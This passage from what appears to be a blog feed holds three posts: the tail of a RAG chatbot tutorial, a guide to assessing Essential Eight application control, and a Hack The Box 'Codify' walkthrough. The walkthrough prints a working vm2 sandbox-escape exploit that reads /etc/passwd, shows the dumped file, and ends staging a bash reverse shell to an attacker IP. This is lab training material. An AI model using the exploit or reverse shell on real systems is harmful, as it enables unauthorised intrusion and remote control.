Embeddings generated and saved to <span class="s1">'data/embeddings.csv'</span><span class="nb">.</span>
Preprocessing complete. Embeddings are ready.

<span class="c"># You can see the blog's links being iterated here.</span>
</code></pre></div></div> <p><strong>Points 3 - 5:</strong> When a user provides the prompt to the service, the embeddings model will generate its vector representation.</p> <p><img src="/assets/img/2024-rag-chatbot/image-of-prompt.png" alt="image of prompt"/></p> <p><strong>Point 6:</strong> The service then compares the prompt’s vector to the Vector DB (in this case, the <code class="language-plaintext highlighter-rouge">.csv</code> file containing the blog’s vector representations is loaded into another data frame).</p> <blockquote> <p><em>The comparision is done using Cosine function to calculate the distance between the question’s embedding and each row’s embedding in the data frame. Cosine distances is a measure used to determine the similarity between two vectors, with lower values indicating higher similarity.</em></p> </blockquote> <p>The service will then iterate over the data frame to accumulate the most similar text until it reaches a pre-defined token limit. This then forms the context for the original prompt.</p> <p><strong>Points 7 - 9:</strong> The context and original prompt are now passed to the GPT model, which returns a generative completion. This completion is presented back to the end-user.</p> <p><img src="/assets/img/2024-rag-chatbot/image-of-completion.png" alt="image of completion"/></p> <h1 id="code-overview">Code overview</h1> <h2 id="data-collection-and-preparation">Data Collection and Preparation</h2> <p><code class="language-plaintext highlighter-rouge">preprocess.py</code> crawls web pages within a specified domain and systematically navigates through the website, extracting text from each page it encounters. The collected text undergoes initial preprocessing to clean and organise the data, making it suitable for further analysis.</p> <p>The script then employs OpenAI’s API to generate embeddings for each piece of text. These embeddings capture the semantic essence of the text in a high-dimensional space, facilitating the identification of contextual similarities between different texts. The processed data and its embeddings are saved for subsequent use, laying the groundwork for the system’s question-answering capabilities.</p> <h2 id="flask-application-for-question-answering">Flask Application for Question Answering</h2> <p>With the data prepared, <code class="language-plaintext highlighter-rouge">app.py</code> serves as the interface between the user and the system’s NLP engine. This script initiates a Flask web application, providing endpoints for users to submit their questions.</p> <p>Upon receiving a query, the application leverages the previously generated embeddings to find the most relevant context within the collected data. It then formulates this context and the user’s question as input for an OpenAI GPT model. The model, trained on vast amounts of text from the internet, generates an answer that reflects the specific information in the crawled data and its understanding of the topic at large. The answer is then returned to the user through the web interface, completing the cycle of query and response.</p> <h2 id="integration-and-workflow">Integration and Workflow</h2> <p>Integrating <code class="language-plaintext highlighter-rouge">preprocess.py</code> and <code class="language-plaintext highlighter-rouge">app.py</code> creates a workflow that bridges web crawling and NLP-driven question-answering. Initially, <code class="language-plaintext highlighter-rouge">preprocess.py</code> lays the foundation by collecting and preparing the data, which <code class="language-plaintext highlighter-rouge">app.py</code> subsequently utilises to offer real-time answers. This allows the system to provide contextually relevant answers informed by the specific context. Users interact with the system through a straightforward web interface, making complex NLP capabilities accessible to anyone with a question to ask.</p> <h2 id="use-cases">Use-cases</h2> <p>Together, these scripts leverage sophisticated machine learning capabilities to demonstrate how existing data from websites can be harnessed to build robust and interactive AI-driven ways to retrieve and discover knowledge.</p> <p>For example, the basic capabilities demonstrated in this project could be applied to create a contextually-aware chatbot on a website.</p>]]></content><author><name></name></author><category term="Artificial-Intelligence"/><category term="RAG"/><category term="LLM"/><category term="NLP"/><category term="natural-language-processing"/><category term="retrieval-augmented-generation"/><category term="large-language-models"/><category term="chatbot"/><category term="python"/><category term="embeddings"/><summary type="html"><![CDATA[A simple example of how RAG can be used for a website's chatbot.]]></summary></entry><entry><title type="html">Application Control</title><link href="https://emdeh.github.io/blog/2024/essential-eight-application-control/" rel="alternate" type="text/html" title="Application Control"/><published>2024-01-25T17:00:00+00:00</published><updated>2024-01-25T17:00:00+00:00</updated><id>https://emdeh.github.io/blog/2024/essential-eight-application-control</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/essential-eight-application-control/"><![CDATA[<h1 id="introduction">Introduction</h1> <h2 id="control-objective">Control objective</h2> <p>The objective of the <strong>Application Control</strong> strategy is to ensure applications are only accessible from appropriate locations and to the appropriate users.</p> <h2 id="expectation">Expectation</h2> <p>It is expected that organisations have a comprehensive approach to managing and controlling the execution of software applications.</p> <p>The approach needs to include the full lifecycle of approving, deploying, and removing software applications. At higher maturity levels, log retention and monitoring are required.</p> <p>The scope of application control is also extended from just workstations to internet-facing servers at maturity level 2 and all workstations servers at maturity level 3.</p> <h2 id="implementing-application-control">Implementing application control</h2> <ul> <li>Identify business critical applications and formally approve their use.</li> <li>Develop application control rules to ensure only approved applications are allowed to execute.</li> <li>Maintain the application control rules using a change management program.</li> <li>Validate application control rules on an annual or more frequent basis. <h1 id="assessment-scope">Assessment scope</h1> </li> </ul> <p>When carrying out application control assessments, it’s important to consider paths related to standard user profiles and temporary directories that are utilised by operating systems, web browsers, and email clients. These can include:</p> <ul> <li><code class="language-plaintext highlighter-rouge">%userprofile%*</code></li> <li><code class="language-plaintext highlighter-rouge">%temp%*</code></li> <li><code class="language-plaintext highlighter-rouge">%tmp%*</code></li> <li><code class="language-plaintext highlighter-rouge">%windir%\Temp*</code></li> </ul> <p>Based on the system’s setup, some overlap may be present; for example, <code class="language-plaintext highlighter-rouge">%temp%</code> and <code class="language-plaintext highlighter-rouge">%tmp%</code> are usually found within <code class="language-plaintext highlighter-rouge">%userprofile%</code>.</p> <blockquote> <p><em>It is important to note that the last major update to the maturity model introduced compiled Hypertext Markup Language (HTML) (<code class="language-plaintext highlighter-rouge">.chm</code> files), HTML applications (<code class="language-plaintext highlighter-rouge">.hta</code> files) and control panel applets (<code class="language-plaintext highlighter-rouge">.cpl</code> files) to the list of file types that need to be controlled. Some application control solutions may not support these file types.</em></p> </blockquote> <h1 id="maturity-level-requirements">Maturity Level requirements</h1> <table> <tr> <th>Level 1</th> <th>Level 2</th> <th>Level 3</th> </tr> <tr> <td>-</td> <td><strong>Application control is implemented on workstations and internet-facing servers.</strong></td> <td>Application control is implemented on workstations and <strong>servers</strong>.</td> </tr> <tr> <td>The execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets is prevented on workstations from within standard user profiles and temporary folders used by the operating system, web browsers and email clients.</td> <td><strong>Application control restricts</strong> the execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets <strong>to an organisation-approved set</strong>.</td> <td>Application control restricts the execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications, control panel applets <strong>and drivers</strong> to an organisation-approved set.</td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Microsoft’s ‘recommended block rules’ are implemented.</strong></td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Microsoft’s ‘recommended driver block rules’ are implemented.</strong></td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Application control rulesets are validated on an annual or more frequent basis.</strong></td> </tr> <tr> <td>-</td> <td><strong>Allowed and blocked execution events on workstations and internet-facing servers are logged.</strong></td> <td>Allowed and blocked execution events on workstations and <strong>servers</strong> are <strong>centrally</strong> logged.</td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Event logs are protected from unauthorised modification and deletion.</strong></td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Event logs are monitored for signs of compromise and actioned when any signs of compromise are detected.</strong></td> </tr> </table> <p><br/></p> <h1 id="assessing-application-control">Assessing Application Control</h1> <p>To assess the effectiveness of application control strategies:</p> <ul> <li>Identify authorised programs.</li> <li>Identify the application control approach that is being used (if in place).</li> <li>Assess the controls using assessment methods and tools.</li> <li>Determine the associated maturity level.</li> </ul> <h1 id="assessment-methods">Assessment methods</h1> <p>Application control assessments are possible without tools, but the efficacy of the tests will be significantly reduced, and edge cases that malicious actors might exploit could be missed. For instance, these actors might deploy bespoke tools to enumerate weak paths in a system.</p> <p>The ACSC provides guidelines and recommendations on the methods and tools that can be used to assess the control.</p> <p>The only true way to test is to attempt execution in all locations against all file types.</p> <p><code class="language-plaintext highlighter-rouge">SysInternals AccessChk</code> application can be used to generate output of folder permissions, but this is only relevant, potentially, for Level 1.</p> <h2 id="e8mvt">E8MVT</h2> <p>Tests application control policies by attempting to write and execute certain file types in specific locations.</p> <p>Also checks for MSFT recommended block rules and drive block rules are implemented.</p> <h2 id="acvt">ACVT</h2> <p>tests application control policy by enumerating all sub-directories and attempts to write and execute each of the relevant file types from each location.</p> <h2 id="scripts">Scripts</h2> <h3 id="get-applocker-policies">Get AppLocker Policies</h3> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Effective</span><span class="w"> </span><span class="nt">-Xml</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Set-Content</span><span class="w"> </span><span class="p">(</span><span class="s1">'c:\windows\temp\curr.xml'</span><span class="p">)</span><span class="se">`</span><span class="w">
</span></code></pre></div></div> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Local</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Test-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Windows\System32\</span><span class="o">*.</span><span class="nf">exe</span><span class="w"> </span><span class="nt">-User</span><span class="w"> </span><span class="nx">Everyone</span><span class="w">
</span></code></pre></div></div> <p>Test in calc.exe or notepad.exe:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Test-AppLockerPolicy</span><span class="w"> </span><span class="nt">-XMLPolicy</span><span class="w"> </span><span class="nx">C:\windows\temp\curr.xml</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\windows\system32\calc.exe</span><span class="p">,</span><span class="w"> </span><span class="nx">C:\windows\system32\notepad.exe</span><span class="w"> </span><span class="nt">-User</span><span class="w"> </span><span class="nx">Everyone</span><span class="w">
</span></code></pre></div></div> <p><br/> <br/></p> <h3 id="sysinternals-accesschk">Sysinternals accesschk</h3> <p>If only trusted Microsoft tools are permitted on the system, <strong>SysInternals AccessChk</strong> can be used for outputting folder permissions, noting this is only suitable for a path-based approach to implementing the control.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">accesschk</span><span class="w"> </span><span class="nt">-dsuvw</span><span class="w"> </span><span class="p">[</span><span class="n">path</span><span class="p">]</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">report.txt</span><span class="w">
</span></code></pre></div></div> <p>Running <code class="language-plaintext highlighter-rouge">whoami /groups</code> would also need to be executed to determine which user groups a typical standard user belonged to in order to determine the effective permissions for each path.</p> <p>This approach is, however, likely to be tedious in assessing effectively. <br/></p> <h1 id="maturity-level-1-guidance">Maturity Level 1 guidance</h1> <p>The intent of application control at Maturity Level 1 can be met without a dedicated application control solution. This is achieved through file system permissions to prevent unnecessary access to user profile directories and temporary folders.</p> <blockquote> <p><strong><em>The execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets is prevented on workstations from within standard user profiles and temporary folders used by the operating system, web browsers and email clients</em>.</strong></p> </blockquote> <p>Given how complex file system permissions can become, to effectively check application control it’s essential to attempt to write and execute from all user-accessible directories.</p> <p>ACSC’s Essential Eight Maturity Verification (E8MVT) and Application Control Verification (ACVT) tools (available to ACSC partners) can assist in achieving this. A number of other tools on the market are also capable enumerating a file system to perform this test.</p> <p>Where applicable, PowerShell cmdlets can be used to test and review AppLocker policies and Sysinternals acesschk can be used if only Microsfot-based tools are avaialble.</p> <p>For a system on which tools cannot be run, and assuming a path-based approach is used, screenshots of the ‘effective access’ permissions for specified folders can be requested. This, however, has limitations because unless screenshots of access permissions are requested for every folder and sub-folder (for which there are usually many), it will not be possible to comprehensively assess whether read, write and execute permissions exist for a given user. Consequently, this will likely impact the quality of evidence cited in the final report.</p> <p>At a minimum, screenshots for key paths (such as temporary folders used by the operating system, web browsers and email clients) should be requested and examined to determine whether inheritance is set, noting that at any point in a path, application control inheritance previously set by an operating system may be disabled by an application installer</p> <h1 id="maturity-level-2-guidance">Maturity Level 2 guidance</h1> <p>Whereas ML1 is focussed on EUC endpoints, ML2 extends application control to internet-facing servers and includes additional log-retention requirements.</p> <h1 id="maturity-level-3-guidance">Maturity Level 3 guidance</h1> <p>ML3 builds on ML2 in that it requires monitoring of logs, application control on <em>all</em> servers, and the implementation of Microsoft’s block rules. Application control rulesets also need to be validated no less than annually. <br/></p> <h1 id="other-information">Other information</h1> <h2 id="considering-kernel">Considering Kernel</h2> <p>Modern computers split virtual memory into kernel and user space. The scope to which an application control solution protects a system’s kernel should be considered.</p> <h2 id="identifying-adversary-attempts-to-execute-malicious-code">Identifying adversary attempts to execute malicious code</h2> <p>Application control can help identify attempts to execute malicious code.</p> <p>This can be achieved by configuring application control to generate event logs for allowed and blocked executions.</p> <p>Event logs should included relevant information such as:</p> <ul> <li>name of the file</li> <li>date/time stamp</li> <li>username of the executing user</li> </ul> <p>Application control logs can also ingest into a SIEM/SOAR system to allow for and contribute to broader context about the threat landscape.</p> <h2 id="applocker-and-wdac">AppLocker and WDAC</h2> <p>AppLocker and Windows Defender Application Control (WDAC) are both security features in Windows, designed to control application usage and restrict unauthorised software. However, they have distinct differences:</p> <ol> <li><strong>Design and Purpose</strong>: <ul> <li><strong>AppLocker</strong>: Primarily aimed at providing administrators with the ability to specify which users or groups can run particular applications, based on unique identities of files. It’s more about managing application access than outright security.</li> <li><strong>WDAC</strong>: Focuses more on security. It is designed to prevent malware and untrusted applications from running by enforcing code integrity policies.</li> </ul> </li> <li><strong>Scope and Control</strong>: <ul> <li><strong>AppLocker</strong>: Works at a more granular level, allowing control over scripts, executable files, Windows Installer files, DLLs, and packaged app installers.</li> <li><strong>WDAC</strong>: Controls the entire spectrum of executable code on the system, including kernel mode drivers and user mode applications.</li> </ul> </li> <li><strong>Implementation and Management</strong>: <ul> <li><strong>AppLocker</strong>: Managed through Group Policy, making it easier to implement in an environment already using Group Policy for configurations.</li> <li><strong>WDAC</strong>: Managed through PowerShell and uses a different policy format, which can be more complex to set up but offers a higher level of security. -</li> </ul> </li> <li><strong>Flexibility and Usability</strong>: <ul> <li><strong>AppLocker</strong>: Offers more flexibility and is simpler to configure, especially for smaller organizations or those with less complex needs.</li> <li><strong>WDAC</strong>: While it provides a stronger security posture, it can be more challenging to implement and manage, particularly in environments with diverse applications.</li> </ul> </li> <li><strong>System Requirements</strong>: <ul> <li><strong>AppLocker</strong>: Available on Windows 7 and newer versions but only for Enterprise and Ultimate editions.</li> <li><strong>WDAC</strong>: Available on Windows 10 and Windows Server 2016 and later, offering broader support across different Windows editions.</li> </ul> </li> <li><strong>Security Level</strong>: <ul> <li><strong>AppLocker</strong>: Considered less robust in terms of security compared to WDAC, as it lacks the more comprehensive system-wide controls.</li> <li><strong>WDAC</strong>: Provides a more secure environment by ensuring that only trusted software runs on the system.</li> </ul> </li> </ol> <p>In summary, while AppLocker is more user-friendly and easier to manage, particularly for application access control, WDAC offers a more comprehensive and secure approach, focusing on system integrity and malware prevention. The choice between the two would depend on the specific needs and capabilities of the organisation, particularly in terms of desired security level and ease of management.</p> <h1 id="useful-resources">Useful resources</h1> <ul> <li><a href="https://learn.microsoft.com/en-us/compliance/essential-eight/e8-app-control">Essential Eight application control - Essential Eight | Microsoft Learn</a></li> <li><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules">Microsoft recommended driver block rules - Windows Security | Microsoft Learn</a></li> <li><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac">Applications that can bypass WDAC and how to block them - Windows Security | Microsoft Learn</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/small-business-cyber-security/small-business-cloud-security-guide/technical-example-application-control">Technical example: Application control | Cyber.gov.au</a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category term="ACSC"/><category term="PSPF"/><category term="ASD"/><category term="ACSC"/><category term="application-control"/><summary type="html"><![CDATA[Assessing Application Control]]></summary></entry><entry><title type="html">Codify</title><link href="https://emdeh.github.io/blog/2024/codify-walkthrough/" rel="alternate" type="text/html" title="Codify"/><published>2024-01-25T14:14:00+00:00</published><updated>2024-01-25T14:14:00+00:00</updated><id>https://emdeh.github.io/blog/2024/codify-walkthrough</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/codify-walkthrough/"><![CDATA[<h1 id="introduction">Introduction</h1> <hr/> <p>Codify presents as a moderately challenging easy box, characterised by a privilege escalation that requires a bit of knowledge of bash secure scripting.</p> <p>Initial access is obtained by web-based Node.js code editor sandbox that allows arbitrary code execution on the host. Arbitrary code is then leveraged to fetch a reverse shell and achieve remote code execution.</p> <p>From there a hash is stolen following further system enumeration. Cracking the hash enables laterally movement, and privilege escalation is achieved by exploiting a vulnerability in a custom backup script that a standard user has elevated privileges over.</p> <p>The box exemplifies the importance of secure coding practices, and the need to use strong, complex, passphrases.</p> <h2 id="methods">Methods</h2> <h3 id="sandbox-escape">Sandbox escape</h3> <p>A sandbox escape refers to an exploit in which malicious code or software breaks out of the sandbox environment in which it’s supposed to be contained. Sandboxing is a security mechanism that isolates applications, processes, or code to reduce the potential harm from a compromised system.</p> <h3 id="arbitrary-code-execution">Arbitrary code execution</h3> <p>Arbitrary code execution is a security vulnerability that occurs when an attacker gains the ability to execute any code of their choice on a target system. This type of exploit allows the attacker to run commands that the system’s designers did not intend to permit, often leading to unauthorised actions such as data theft, system compromise, or further exploitation of other vulnerabilities.</p> <p>Key aspects of arbitrary code execution include:</p> <ol> <li> <p><strong>Control Over Execution Flow:</strong> The attacker finds a way to divert the normal execution flow of a program, injecting or directing it to run unexpected code.</p> </li> <li> <p><strong>Running Unauthorised Commands:</strong> The code executed can do anything that the application’s permissions allow, depending on the system’s privileges and security controls.</p> </li> <li> <p><strong>Common Causes:</strong> It often results from vulnerabilities like buffer overflows, injection flaws, insecure deserialization, or other weaknesses that allow an attacker to inject malicious code into a process.</p> </li> <li> <p><strong>Severity:</strong> Arbitrary code execution is considered a severe security issue because it can lead to complete system takeover, data breaches, or serve as a gateway for further attacks.</p> </li> <li> <p><strong>Mitigation:</strong> Prevention includes secure coding practices, input validation, using memory-safe languages, regular security testing, and keeping systems updated with security patches.</p> </li> </ol> <h3 id="remote-code-execution">Remote code execution</h3> <p>Remote Code Execution (RCE) is a severe security vulnerability that allows an attacker to run arbitrary code on a target machine or server across a network, such as the internet, without having physical access to it. This type of vulnerability is particularly dangerous as it can be exploited remotely to gain control over another system.</p> <p>The distinction between RCE and ACE lies in the attack vector.</p> <ul> <li>RCE is specifically about remote exploitation, where the attack occurs over a network.</li> <li>ACE is a broader term that covers any situation (both local and remote) where an attacker can execute code of their choice but does not specify the method of delivery.</li> </ul> <p>In the context of this post, the arbitrary code execution relates to running commands in the codify editor that the system did not intend to allow, whereas remote code execution relates to when a reverse shell is established and execution of commands was done remotely to the system.</p> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/nmap/nmap">Nmap</a></li> <li><a href="https://github.com/koalaman/shellcheck">Shellcheck</a></li> <li><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16</a></li> </ul> <h2 id="tactics">Tactics</h2> <ul> <li>Dictionary attack (Hashcat)</li> <li>Brute forcing (glob matching)</li> </ul> <h1 id="enumeration">Enumeration</h1> <p>As always, enumeration starts with Nmap scanning.</p> <h2 id="nmap-scanning">Nmap scanning</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> 10.129.6.167 | <span class="nb">tee </span>nmap-output.txt
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-01-24 04:53 GMT
Nmap scan report <span class="k">for </span>10.129.6.167
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>32.50 seconds
</code></pre></div></div> <h3 id="findings">Findings</h3> <ol> <li>Three ports open: <ul> <li>22</li> <li>80</li> <li>3000</li> </ul> </li> <li>Domain name http://codify.htb</li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>The domain http://codify.htb can be added to the local hosts file:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.6.167 codify.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.129.6.167 codify.htb
</code></pre></div></div> <p>This makes it reachable and reveals a page that purports to allow Node.js code to be tested in a sandbox environment. The site states that:</p> <blockquote> <p><em>“Codify is a simple web application that allows you to test your Node.js code easily…Codify uses sandboxing technology to run your code. This means that your code is executed in a safe and secure environment, without any access to the underlying system.”</em></p> </blockquote> <p><img src="/assets/img/2024-codify/20240125-codify-webpage.png" alt="20240125-codify-webpage.png" class="auto-resize"/></p> <p>The site also lists some limitations that are in place for security of the platform. These include restricting the importation of <code class="language-plaintext highlighter-rouge">child_processes</code> and <code class="language-plaintext highlighter-rouge">fs</code> modules.</p> <p>The site goes on to say:</p> <blockquote> <p>“<em>This is to prevent users from executing arbitrary system commands, which could be a major security risk.</em>”</p> </blockquote> <p>Then lists the following modules as being available for import:</p> <ul> <li>url</li> <li>crypto</li> <li>util</li> <li>events</li> <li>assert</li> <li>stream</li> <li>path</li> <li>os</li> <li>zlib</li> </ul> <p>Another page details that the Code Editor uses the <strong>vm2</strong> library. Clicking the link leads to the <strong>3.9.16 version release of vm2</strong>.</p> <p>Researching <strong>vm2</strong> version 3.9.16 reveals a critical <strong>sandbox breakout</strong> vulnerability: https://nvd.nist.gov/vuln/detail/CVE-2023-29199</p> <blockquote> <p>“<em>attackers (can) bypass <code class="language-plaintext highlighter-rouge">handleException()</code> and leak unsanitized host exceptions which can be used to escape the sandbox and run arbitrary code in host context…</em>”</p> </blockquote> <h2 id="what-is-nodejs">What is Node.js</h2> <p>Node.js is an open-source, cross-platform JavaScript runtime environment that executes JavaScript code outside of a web browser. It’s built on Chrome’s V8 JavaScript engine and allows developers to use JavaScript to write command-line tools and for server-side scripting—running scripts server-side to produce dynamic web page content before the page is sent to the user’s web browser.</p> <h1 id="exploitation">Exploitation</h1> <h2 id="proof-of-concept">Proof of Concept</h2> <p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">Sandbox Escape in vm2@3.9.16</a></p> <p><strong>vm2</strong> is a module in Node.js that creates isolated environments (sandboxes) to safely run untrusted JavaScript code. In <strong>version 3.9.16 of vm2</strong>, there is a security flaw in the way it processes errors or exceptions. Normally, vm2 should prevent code inside the sandbox from affecting or accessing the host system. The flaw involves a complex interaction where a custom error object can be manipulated to bypass vm2’s security checks. By exploiting this, an attacker can execute any code they want on the host system, not just within the sandbox.</p> <p>An example of how this vulnerability could be used to display the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, which is a common file in Unix-like systems that contains user account information is:</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span><span class="nx">VM</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">vm2</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">VM</span><span class="p">();</span>

<span class="kd">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="s2">`
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd');
}
`</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>

</code></pre></div></div> <p>In this code:</p> <ul> <li>A custom error object <code class="language-plaintext highlighter-rouge">err</code> and a <code class="language-plaintext highlighter-rouge">handler</code> are created with a method that triggers an error.</li> <li>A JavaScript feature called <code class="language-plaintext highlighter-rouge">Proxy</code> is used to intercept operations on the <code class="language-plaintext highlighter-rouge">err</code> object, specifically the <code class="language-plaintext highlighter-rouge">getPrototypeOf</code> operation, which is supposed to return an object’s prototype.</li> <li>In the <code class="language-plaintext highlighter-rouge">try...catch</code> block, the proxied error object is thrown. Due to the vulnerability, the <code class="language-plaintext highlighter-rouge">catch</code> block is manipulated to access Node.js’s core modules.</li> <li>The <code class="language-plaintext highlighter-rouge">child_process</code> module’s <code class="language-plaintext highlighter-rouge">execSync</code> function is then used to execute the <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> command, displaying the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file.</li> <li>This output is then logged to the console.</li> </ul> <p>Running this code in the page’s editor successfully returns the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file, demonstrating the breakout and arbitrary command execution.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
</code></pre></div></div> <h2 id="initial-access">Initial access</h2> <p>The objective now is to use the PoC to achieve <strong>remote code execution</strong> by manipulating the target to fetch a reverse shell.</p> <h3 id="staging">Staging</h3> <p>To achieve this a simple file containing a reverse shell can be created:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.15/4321 0&gt;&amp;1
